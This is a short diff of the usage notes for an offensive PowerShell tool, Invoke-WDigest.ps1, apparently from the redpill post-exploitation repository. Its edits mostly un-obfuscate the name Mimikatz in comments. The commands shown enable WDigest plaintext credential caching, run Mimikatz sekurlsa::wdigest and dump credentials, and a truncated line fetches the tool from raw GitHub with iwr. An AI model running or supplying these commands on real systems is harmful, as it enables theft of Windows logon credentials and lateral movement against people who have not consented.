@@ -18,15 +18,16 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Device
 # Cmdlet help
 Get-Help .\Invoke-WDigest.ps1 -full
 
-# Execute M[i]mika[t]z (interactive shell) without WDigest caching
+# Execute Mimikatz (interactive shell) without WDigest caching
 .\Invoke-WDigest.ps1 -wdigest 'false' -mimicats
 
-#  Ativate WDigest caching + Execute M[i]mika[t]z sekurlsa::wdigest
+#  Ativate WDigest caching + Execute Mimikatz sekurlsa::wdigest exit
 .\Invoke-WDigest.ps1 -wdigest 'true' -mimicats
+
 
 [FAST DEMONSTRATION]
 
-## Ativate WDigest caching + dump credentials
+## Ativate WDigest caching + dump created credential
 .\Invoke-WDigest.ps1 -WDigest 'true' -mimicats -runas
 
 WORKFLOW
